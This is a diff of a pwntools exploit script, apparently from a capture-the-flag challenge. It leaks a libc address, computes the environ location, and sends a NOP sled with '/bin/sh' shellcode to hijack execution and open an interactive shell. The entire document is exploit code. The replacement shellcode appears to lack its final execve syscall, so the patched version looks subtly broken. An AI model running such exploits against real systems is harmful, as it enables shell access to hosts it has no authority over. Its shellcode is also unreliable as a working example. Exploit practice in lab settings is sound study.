@@ -14,8 +14,6 @@ libc = ELF('./libc.so.6')
 environ_offset = 0x3c6f38
 stdout_offset = libc.symbols['stdout']
 
-#buf = $rbp-0x20
-
 p.recvuntil('stdout: ')
 recv_stdout_addr = b'0000'+p.recvline()[2:-1]
 recv_stdout_addr = int(recv_stdout_addr,16)
@@ -26,12 +24,13 @@ environ_addr = libc_base+environ_offset
 log.info('libc_base : '+str(hex(libc_base)))
 log.info('environ : '+str(hex(environ_addr)))
 
-shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
-ret_addr = environ_addr-0xf8
-log.info('ret_addr : '+str(ret_addr))
+shellcode = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7'
 
-p.sendlineafter('Size: ','30')
-p.sendlineafter('Data: ',shellcode)
-p.sendlineafter('*jmp=',str(ret_addr))
+payload = b'\x90'*0x118
+payload += shellcode
+
+p.sendlineafter('Size: ','1000')
+p.sendlineafter('Data: ',payload)
+p.sendlineafter('*jmp=',str(environ_addr))
 
 p.interactive()
